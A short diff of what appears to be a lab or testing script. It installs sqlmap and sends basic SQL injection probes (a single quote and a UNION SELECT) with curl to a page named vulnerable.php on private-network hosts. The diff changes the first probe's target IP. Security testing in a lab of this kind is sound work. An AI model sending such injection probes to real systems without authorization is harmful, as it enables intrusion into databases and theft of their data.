@@ -13,7 +13,7 @@ dnf install -y sqlmap curl wget python3 python3-pip
 
 
 # Test with a single quote (basic SQL injection attempt)
-curl --noproxy "*" http://10.10.0.2/vulnerable.php?id=1%27
+curl --noproxy "*" http://192.168.1.101/vulnerable.php?id=1%27
 
 # Test with a UNION statement
 curl --noproxy "*" http://10.10.0.2/vulnerable.php?id=1%20UNION%20SELECT%201,2,3
